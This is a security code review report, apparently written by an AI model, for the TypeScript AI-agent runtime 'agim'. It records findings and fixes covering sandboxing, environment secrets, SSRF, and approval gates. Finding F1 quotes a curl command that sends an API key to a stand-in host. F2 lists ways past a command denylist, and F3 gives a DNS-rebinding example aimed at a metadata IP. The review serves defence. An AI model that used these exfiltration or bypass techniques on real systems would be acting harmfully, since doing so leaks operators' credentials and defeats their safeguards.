# Code Review: agim v1.3.6

**Reviewer:** Claude (delegated multi-agent review + manual source verification)
**Scope:** whole project (~112k LOC TypeScript), focus on security boundaries, correctness, concurrency
**Date:** 2026-06-22
**Method:** 3 Explore agents (web / core runtime / plugins+CLI) in parallel; **every headline
finding re-verified by reading the source directly.** The web and plugin agents had a high
false-positive rate (documented in §3); the core-runtime agent was accurate.

> Companion to `CODE_REVIEW_v1.2.55-v1.2.69.md`. This pass checks which of those findings were
> fixed by v1.3.6 and adds new ones. **Findings F1–F5 are FIXED in this change set** (see §5).

---

## 1. Confirmed findings (severity-ordered, source-verified)

### 🔴 P0 — security boundaries

**F1 · child processes inherited the full `process.env` → secret exfil** ✅ FIXED
`src/core/llm/exec-dispatcher.ts` — `env = { ...process.env, ...extraEnv }`.
A `native_exec` command could read every secret the agent holds (`*_API_KEY`, `DB_PASSWORD`,
`SSH_*`) and exfil via `curl -d "$OPENAI_API_KEY" https://allowed.example`, defeating all SSRF
guards. (Was CR-14, still unfixed at v1.3.6.)
**Fix:** env allow-list (`buildExecEnv`): a small safe base set + per-spawn RPC injection +
operator opt-in via `IMHUB_EXEC_ENV_PASS`. Everything else dropped.

**F2 · bwrap sandbox was opt-in (default OFF)** ✅ FIXED
`src/core/llm/exec-dispatcher.ts` — `sandboxConfigured = sandboxMode === 'bwrap' && existsSync(...)`.
Default was `/bin/sh -c <cmd>` with no namespace isolation. The dangerous-pattern denylist is a
regex tripwire (trivially bypassed: `\rm`, `bash -c '…'`, `eval`, `/bin/rm`), so bwrap is the only
real boundary — yet it had to be turned on manually. (Was CR-6, still unfixed.)
**Fix:** default-on when `/usr/bin/bwrap` exists; only `IMHUB_EXEC_SANDBOX=off` disables it, and
that path now logs a loud one-shot WARN.

**F3 · DNS-rebinding SSRF was open** ✅ FIXED
`src/core/llm/web-dispatcher.ts` — non-IP hostnames returned `{ ok: true }` unresolved. The
IP-literal checks (CR-3/CR-4) were rewritten well, but `evil.example.com` → `169.254.169.254`
sailed through to `fetch()`. (Was CR-2, still unfixed; source comment admitted it.)
**Fix:** new `checkUrlSafetyAsync` resolves the hostname (`dns.lookup({all:true})`) and runs every
A/AAAA record through the same `checkIpv4Safety`/`checkIpv6Safety` used for literals; fail-closed on
resolution error. Wired into the initial fetch and every redirect hop.
**Residual:** `fetch()` re-resolves at connect time, so a TTL-0 rebind between check and connect can
still slip through. True closure needs a connection-level lookup pin (custom undici dispatcher) —
flagged as a follow-up. This removes the trivial bypass.

### 🟠 P1 — high

**F4 · `read-only` mode auto-allowed `web_fetch`** ✅ FIXED
`src/core/llm/policy-approval-gate.ts` — `READ_ONLY_HINTS` contained `'fetch'`, so
`native_web_fetch` (the largest SSRF surface) was auto-allowed in "read-only" mode. (Was CR-18.)
**Fix:** removed `'fetch'` from the heuristic. Outbound fetch now needs explicit `autoAllow` or an
approval card. (Longer-term: replace the substring heuristic with an explicit `ToolDef.readOnly`.)

**F5 · `verifyToken` rewrote `tokens.json` on every successful auth (race)** ✅ FIXED
`src/core/access-token.ts` — each auth did a read-modify-write to stamp `last_used_at`, racing with
concurrent `createToken`/`setTokenRole`/`revokeToken` (last-write-wins could silently drop a freshly
created token or a role change). Token comparison itself is `timingSafeEqual` (safe). *(New finding.)*
**Fix:** throttle the write — only rewrite when the stamp is stale (≥30s), shrinking the race window
to near-zero for the common repeated-request case while still recording usage.

**F6 · inbound sender allow-list is default-open AND fail-open** ⚠️ NOT CHANGED
`src/cli.ts` — the central `isSenderAllowed` gate is applied to all platforms, but when the check
throws it `catch`es and continues processing ("continuing open"). A deny-gate that fails open.
**Recommendation:** at minimum make the failure fail-closed or emit a high-visibility alert.
(Default-open when unconfigured is a documented design choice with a boot WARN — left as-is.)

**F7 · `long_task` silently pauses the prior active goal** ⚠️ NOT CHANGED
`src/core/goal-rpc.ts` → `setActiveGoal` unconditionally pauses the existing goal, no confirmation.
(Was CR-17.) **Recommendation:** add a `force` param; default false rejects with a hint to
`complete_goal` first.

### 🟡 P2 — medium (recommendations, not changed)

- **F8** `approval-bus.ts` `pendingById`/`pendingByThread` have no upper bound → OOM under approval spam. Add a cap + oldest-eviction.
- **F9** `goal-rpc.ts` `complete_goal` is not idempotent; retries rewrite a closed goal. (CR-30.)
- **F10** `exec-dispatcher` `clampTimeout` lacks a lower bound; `timeout_ms=1` self-DoS. (CR-15.) Use `Math.max(100, …)`.
- **F11** `web-dispatcher` `hasRipgrep()` checks two hardcoded paths and caches forever; no PATH lookup. (CR-24.)
- **F12** Discord adapter: with only `allowedGuilds` set (no `allowedChannels`), DMs (`message.guildId` empty) skip the guild check (`discord-adapter.ts:223`). Backstopped by the central allow-list if `IMHUB_ALLOWED_USERS` is set; otherwise DMs reach the agent. Add an explicit DM policy.
- **F13** Approval notifier errors are uniformly silent-deny (`approval-bus.ts`); an IM-push outage looks like a model "denied" with no operator signal. (CR-19.)

---

## 2. What's done well

- ✅ Token compare uses `timingSafeEqual` on sha256 digests (`access-token.ts` / `utils/safe-equal.ts`) — no timing side channel.
- ✅ Tokens stored only as sha256; raw written once to a chmod-600 file, logs record id only (R13-compliant).
- ✅ Artifact download validates `name.includes('/') || name === '..'` on **both** code paths (`artifacts.ts:214`, `server.ts:4928`) — no path traversal.
- ✅ `viewer-render.ts` escapes content before output and sanitizes markdown with DOMPurify — no stored XSS.
- ✅ Login `?next=` has a `safeNext()` same-origin guard (`login.tsx:40`) — no open redirect.
- ✅ IP-literal SSRF parsing was rewritten (integer/octal/hex/IPv6-compressed; CR-3/CR-4 fixed).
- ✅ Loopback trust auto-disables when proxy-forward headers are present (`server.ts:isLoopbackPeer`).
- ✅ Three-layer `IMHUB_PLATFORM_BLACKLIST`, symlink realpath guard (CR-1 fixed), UTF-8 truncation fix (CR-11 fixed).

---

## 3. False positives (raised by sub-agents, disproven on review — do not re-investigate)

| Reported | Reality |
|---|---|
| Timing side channel in token verify | False — `timingSafeEqual` (access-token.ts:225) |
| Cookie token CRLF injection | False — token is verified + random, `encodeURIComponent` applied |
| Path traversal in artifact download | False — `readOutput` and fallback both block `/` and `..` |
| Bootstrap token printed to stdout | False — written to chmod-600 file, logs record id only |
| Open redirect via `?next=` | False — `login.tsx` `safeNext()` restricts to same-origin |
| Stored XSS in viewer | False — escapeHtml + DOMPurify |
| Login brute-force (high) | Weak — tokens are 160-bit random; rate-limit is nice-to-have only |
| JSON bomb (exponential parse) | Weak — `JSON.parse` is linear; 1 MiB body cap already exists |
| CSRF (high) | Weak — `SameSite=Lax` + JSON content-type already mitigate |
| Feishu/DingTalk webhook unsigned | Unproven — official-SDK long-poll; verification lives in the SDK (no evidence either way) |

---

## 4. Priority (if only three)

1. **F2 bwrap default-on** — biggest leverage; makes F1's boundary real.
2. **F1 env allow-list** — directly stops secret exfil.
3. **F3 DNS-aware SSRF** — closes the trivial rebind bypass.

(All three, plus F4 and F5, are addressed in this change set.)

---

## 5. Changes made in this commit

| File | Finding | Change |
|---|---|---|
| `src/core/llm/exec-dispatcher.ts` | F1 | `buildExecEnv()` env allow-list + `IMHUB_EXEC_ENV_PASS` |
| `src/core/llm/exec-dispatcher.ts` | F2 | bwrap default-on; `=off` warns once |
| `src/core/llm/web-dispatcher.ts` | F3 | `checkUrlSafetyAsync()` DNS-resolving SSRF check, wired into fetch + redirects |
| `src/core/llm/policy-approval-gate.ts` | F4 | removed `'fetch'` from `READ_ONLY_HINTS` |
| `src/core/access-token.ts` | F5 | throttled `last_used_at` write (≥30s) |
| `*.test.ts` (4 files) | — | red-team + regression tests for F1–F5 |

**Verification:** `tsc --noEmit` (src + test) exit 0; `biome lint` exit 0 (pre-existing infos only);
the 4 touched suites pass (105/105). The 6 failures in the full `bun test` run are all pre-existing
on the clean baseline (5 cross-test global-state pollution per `AGENTS.md`, 1 pre-existing
`runAgentLoop` maxIterations case) — none introduced here.

**Not addressed (recommended follow-ups):** F6 fail-open sender gate, F7 goal auto-pause, F8–F13.

---

**End of report.**
